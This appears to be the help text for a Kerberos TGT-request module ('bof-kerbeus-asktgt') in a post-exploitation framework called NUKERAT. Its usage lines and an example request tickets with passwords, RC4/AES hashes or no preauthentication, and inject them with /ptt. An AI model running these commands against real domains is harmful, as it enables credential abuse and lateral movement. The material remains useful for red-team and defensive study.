ABOUT
    Request a TGT using password, hash, or no preauth.
USAGE:
    bof-kerbeus-asktgt --- /user:USER /password:PASSWORD [/domain:DOMAIN] [/dc:DC] [/enctype:{rc4|aes256}] [/ptt] [/nopac] [/opsec]
    bof-kerbeus-asktgt --- /user:USER /aes256:HASH [/domain:DOMAIN] [/dc:DC] [/ptt]
    bof-kerbeus-asktgt --- /user:USER /rc4:HASH [/domain:DOMAIN] [/dc:DC] [/ptt]
    bof-kerbeus-asktgt --- /user:USER /nopreauth [/domain:DOMAIN] [/dc:DC] [/ptt]

EXAMPLES:
    bof-kerbeus-asktgt --- /user:admin /password:P@ss /domain:corp.local /ptt

NUKERAT FLAGS:
    -w <seconds>    Maximum wait time until timeout
    -bg             Fork and run without waiting for output

    Example:
    bof-kerbeus-asktgt -w 60 --- /user:admin /password:P@ss /domain:corp.local /ptt
